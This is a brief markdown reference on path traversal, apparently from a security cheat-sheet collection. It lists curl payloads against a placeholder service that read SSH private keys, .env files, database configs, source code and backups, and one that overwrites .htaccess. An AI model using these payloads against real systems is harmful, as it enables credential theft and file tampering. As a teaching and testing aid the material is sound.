# Path Traversal

## Table of Contents
- [Information Disclosure](#information-disclosure)
- [Arbitrary File Modification](#arbitrary-file-modification)

## Information Disclosure

### Credentials used for remote access can be exposed.

- SSH key file exposure
   ```bash
   curl https://[VULNERABLE-SERVICE]/read?filename=../../../../home/user/.ssh/id_rsa
   ```
  
### Sensitive information used in project can be exposed.

- Hard-coded secret information exposure
   ```bash
   curl https://[VULNERABLE-SERVICE]/read?filename=../../../../config/db_config.php
   ```

- Source code exposure
   ```bash
   curl https://[VULNERABLE-SERVICE]/read?filename=../../../../app.js
   ```

- .env file exposure
   ```bash
   curl https://[VULNERABLE-SERVICE]/read?filename=../../../../.env
   ```
  
- Backup file exposure
   ```bash
   curl https://[VULNERABLE-SERVICE]/read?filename=../../../../backup/backup.zip
   ```

## Arbitrary File Modification

### Key files can be overwritten or deleted.

- Overwrite .htaccess file
   ```bash
   curl https://[VULNERABLE-SERVICE]/upload?filename=../../../../.htaccess
   ```
